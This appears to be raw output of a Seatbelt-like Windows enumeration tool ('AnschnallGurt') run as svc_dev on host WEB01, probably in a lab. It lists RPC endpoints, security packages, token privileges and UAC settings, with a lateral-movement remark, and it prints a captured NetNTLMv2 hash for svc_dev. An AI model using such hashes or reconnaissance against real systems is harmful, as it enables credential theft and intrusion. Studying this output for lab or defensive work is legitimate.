  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-60b5ee9cad5367edf2]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-bfeb6e206f46ef05cd]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-60b5ee9cad5367edf2]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-bfeb6e206f46ef05cd]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-a8fccacee4f4f89e31]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-60b5ee9cad5367edf2]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-bfeb6e206f46ef05cd]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-a8fccacee4f4f89e31]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-7240ee54545d27b7e6]
  df4df73a-c52d-4e3a-8003-8437fdf8302a v0.0 (WM_WindowManagerRPC\Server): ncalrpc:[LRPC-c921ecce961477dd10]
  0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[ubpmtaskhostchannel]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-113f2e31b493a2a3c5]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-113f2e31b493a2a3c5]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_ip_tcp:[49666]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-113f2e31b493a2a3c5]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_ip_tcp:[49666]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[senssvc]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-a402f09e1136f22be6]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[IUserProfile2]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-d299b51240a217d7fb]
  2eb08e3e-639f-4fba-97b1-14f878961076 v1.0 (Group Policy RPC Interface): ncalrpc:[LRPC-6e66bd44da63c6b7fd]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncalrpc:[eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_np:[\\pipe\\eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_ip_tcp:[49665]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-dca82d9822790c1b92]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-dca82d9822790c1b92]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-a3737bdd538536e91d]
  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[LRPC-4db6eeb24515162d41]
  7ea70bcf-48af-4f6a-8968-6a440754d5fa v1.0 (NSI server endpoint): ncalrpc:[LRPC-b6d6907282f4cefa41]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-51da90a59253c8bf19]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (Network Connection Broker server endpoint for NCB Reset module): ncalrpc:[LRPC-51da90a59253c8bf19]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (Network Connection Broker server endpoint for NCB Reset module): ncalrpc:[LRPC-fe75f6ace764fa1349]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-51da90a59253c8bf19]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-fe75f6ace764fa1349]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[OLE0E2F9F1420FA359CA499DB74D3E5]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-de77a62b9762b2b2b4]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-51da90a59253c8bf19]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-fe75f6ace764fa1349]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[OLE0E2F9F1420FA359CA499DB74D3E5]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-de77a62b9762b2b2b4]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-bab71b4a6d30b36460]
  4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9 v1.0 (): ncalrpc:[umpo]
  085b0334-e454-4d91-9b8c-4134f9e793f3 v1.0 (): ncalrpc:[umpo]
  8782d3b9-ebbd-4644-a3d8-e8725381919b v1.0 (): ncalrpc:[umpo]
  3b338d89-6cfa-44b8-847e-531531bc9992 v1.0 (): ncalrpc:[umpo]
  bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760 v1.0 (): ncalrpc:[umpo]
  5824833b-3c1a-4ad2-bdfd-c31d19e23ed2 v1.0 (): ncalrpc:[umpo]
  0361ae94-0316-4c6c-8ad8-c594375800e2 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[actkernel]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[umpo]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[actkernel]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[umpo]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[actkernel]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[umpo]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[actkernel]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[umpo]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[actkernel]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[umpo]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[actkernel]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[umpo]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[actkernel]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[umpo]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[actkernel]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[umpo]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[actkernel]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[umpo]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[actkernel]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[umpo]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[actkernel]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[umpo]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[actkernel]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  2c7fd9ce-e706-4b40-b412-953107ef9bb0 v0.0 (): ncalrpc:[umpo]
  c521facf-09a9-42c5-b155-72388595cbf0 v0.0 (): ncalrpc:[umpo]
  1832bcf6-cab8-41d4-85d2-c9410764f75a v1.0 (): ncalrpc:[umpo]
  4dace966-a243-4450-ae3f-9b7bcb5315b8 v2.0 (): ncalrpc:[umpo]
  178d84be-9291-4994-82c6-3f909aca5a03 v1.0 (): ncalrpc:[umpo]
  e53d94ca-7464-4839-b044-09a2fb8b3ae5 v1.0 (): ncalrpc:[umpo]
  fae436b0-b864-4a87-9eda-298547cd82f2 v1.0 (): ncalrpc:[umpo]
  082a3471-31b6-422a-b931-a54401960c62 v1.0 (): ncalrpc:[umpo]
  6982a06e-5fe2-46b1-b39c-a2c545bfa069 v1.0 (): ncalrpc:[umpo]
  0ff1f646-13bb-400a-ab50-9a78f2b7a85a v1.0 (): ncalrpc:[umpo]
  4ed8abcc-f1e2-438b-981f-bb0e8abc010c v1.0 (): ncalrpc:[umpo]
  95406f0b-b239-4318-91bb-cea3a46ff0dc v1.0 (): ncalrpc:[umpo]
  0d47017b-b33b-46ad-9e18-fe96456c5078 v1.0 (): ncalrpc:[umpo]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[umpo]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[actkernel]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[umpo]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[actkernel]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-7b6aaec5d1d1ffc5ad]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7b6aaec5d1d1ffc5ad]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[umpo]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[actkernel]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-7b6aaec5d1d1ffc5ad]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[dabrpc]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0B1680]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WindowsShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WMsgKRpc0B1680]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WindowsShutdown]
====== SCCM ======

  Server                         :
  SiteCode                       :
  ProductVersion                 :
  LastSuccessfulInstallParams    :

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

ERROR: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.ScheduledTasksCommand.<Execute>d__10.MoveNext()
====== SearchIndex ======

====== SecPackageCreds ======

  Version                        : NetNTLMv2
  Hash                           : svc_dev::WEB01:1122334455667788:e097f4ccd04828da4c523ad0ca2a3d60:0101000000000000861c6433afbbdc01347b2cd46950f17e000000000800300030000000000000000000000000200000f08dbc512d4fe634ffec049e0e597d76df62a17680beb2bd5baa26f56c8e994a0a00100000000000000000000000000000000000090000000000000000000000

====== SecurityPackages ======

Security Packages


  Name                           : Negotiate
  Comment                        : Microsoft Package Negotiator
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, NEGOTIABLE, GSS_COMPATIBLE, LOGON, RESTRICTED_TOKENS, APPCONTAINER_CHECKS
  MaxToken                       : 48256
  RPCID                          : 9
  Version                        : 1

  Name                           : NegoExtender
  Comment                        : NegoExtender Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, NEGOTIABLE, GSS_COMPATIBLE, LOGON, MUTUAL_AUTH, NEGO_EXTENDER, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 30
  Version                        : 1

  Name                           : Kerberos
  Comment                        : Microsoft Kerberos V1.0
  Capabilities                   : 42941375
  MaxToken                       : 48000
  RPCID                          : 16
  Version                        : 1

  Name                           : NTLM
  Comment                        : NTLM Security Package
  Capabilities                   : 42478391
  MaxToken                       : 2888
  RPCID                          : 10
  Version                        : 1

  Name                           : TSSSP
  Comment                        : TS Service Security Package
  Capabilities                   : CONNECTION, MULTI_REQUIRED, ACCEPT_WIN32_NAME, MUTUAL_AUTH, APPCONTAINER_CHECKS
  MaxToken                       : 13000
  RPCID                          : 22
  Version                        : 1

  Name                           : pku2u
  Comment                        : PKU2U Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, GSS_COMPATIBLE, MUTUAL_AUTH, NEGOTIABLE2, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 31
  Version                        : 1

  Name                           : CloudAP
  Comment                        : Cloud AP Security Package
  Capabilities                   : LOGON, NEGOTIABLE2, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 0
  RPCID                          : 36
  Version                        : 1

  Name                           : WDigest
  Comment                        : Digest Authentication for Windows
  Capabilities                   : TOKEN_ONLY, IMPERSONATION, ACCEPT_WIN32_NAME, APPCONTAINER_CHECKS
  MaxToken                       : 4096
  RPCID                          : 21
  Version                        : 1

  Name                           : Schannel
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Microsoft Unified Security Protocol Provider
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Default TLS SSP
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

====== Services ======

Non Microsoft Services (via WMI)

ERROR:   [!] Terminating exception running command 'Services': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.ServicesCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== SlackDownloads ======

====== SlackPresence ======

====== SlackWorkspaces ======

====== SuperPutty ======

====== Sysmon ======

ERROR: Unable to collect. Must be an administrator.
====== SysmonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== TcpConnections ======

  Local Address          Foreign Address        State      PID   Service         ProcessName
ERROR:   [!] Terminating exception running command 'TcpConnections': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.TcpConnectionsCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== TokenGroups ======

Current Token's Groups

  WEB01\None                               S-1-5-21-197600473-3515118913-3158175032-513
  Everyone                                 S-1-1-0
  BUILTIN\Users                            S-1-5-32-545
  NT AUTHORITY\NETWORK                     S-1-5-2
  NT AUTHORITY\Authenticated Users         S-1-5-11
  NT AUTHORITY\This Organization           S-1-5-15
  NT AUTHORITY\Local account               S-1-5-113
  NT AUTHORITY\NTLM Authentication         S-1-5-64-10
====== TokenPrivileges ======

Current Token's Privileges

                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
====== UAC ======

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA (Is UAC enabled?)    : 1
  LocalAccountTokenFilterPolicy  :
  FilterAdministratorToken       : 0
    [*] Default Windows settings - Only the RID-500 local admin account can be used for lateral movement.
====== UdpConnections ======

  Local Address          PID    Service                 ProcessName
ERROR:   [!] Terminating exception running command 'UdpConnections': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.UdpConnectionsCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== UserRightAssignments ======

Must be an administrator to enumerate User Right Assignments
====== WifiProfile ======

ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotFoundException: Unable to load DLL 'Wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
   at AnschnallGurt.Interop.Wlanapi.WlanOpenHandle(UInt32 dwClientVersion, IntPtr pReserved, UInt32& pdwNegotiatedVersion, IntPtr& ClientHandle)
   at AnschnallGurt.Commands.Windows.WifiProfileCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WindowsAutoLogon ======

  DefaultDomainName              : WEB01
  DefaultUserName                : svc_dev
  DefaultPassword                :
  AltDefaultDomainName           :
